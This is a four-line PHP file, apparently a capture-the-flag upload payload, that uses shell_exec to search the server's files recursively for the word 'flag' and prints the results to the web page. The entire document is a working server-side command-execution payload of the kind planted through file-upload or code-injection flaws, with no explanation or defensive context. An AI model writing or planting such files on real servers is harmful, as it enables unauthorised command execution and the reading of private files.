<?php
$output = shell_exec("grep -rnw '.' -e 'flag'");
echo "<pre>$output</pre>";
?>